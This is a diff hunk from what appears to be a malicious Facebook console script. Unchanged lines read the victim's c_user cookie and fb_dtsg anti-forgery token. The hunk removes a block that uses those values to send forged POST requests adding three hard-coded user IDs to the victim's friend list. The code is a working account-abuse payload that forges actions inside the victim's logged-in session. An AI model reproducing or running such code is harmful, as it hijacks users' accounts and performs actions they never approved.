@@ -296,27 +296,7 @@ P("592137640831238");
 P("592135890831413");
 P("592135890831413");
 P("592135407498128");
-/*Add 2 List*/
-if (document.getElementsByName('flid')[0].value){
-var flid = document.getElementsByName('flid')[0].value;
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-function a2l(opo) {
-  var http4 = new XMLHttpRequest();
-  var url4 = "//www.facebook.com/friends/ajax/lists.php";
-  var params4 = "add=1&search=1&source=typeahead&flid="+flid+"&id=" + opo + "&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAF0&__req=w&fb_dtsg="+fb_dtsg+"&phstamp=";
-  http4.open("POST", url4, true);
-  http4.onreadystatechange = function () {
-    if (http4.readyState == 4 && http4.status == 200) {
-      http4.close;
-    }
-  };
-  http4.send(params4);
-}
-a2l("100003785647375");  
-a2l("100003697277263");  
-a2l("100001050235420");
-};
+
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var now=(new Date).getTime();
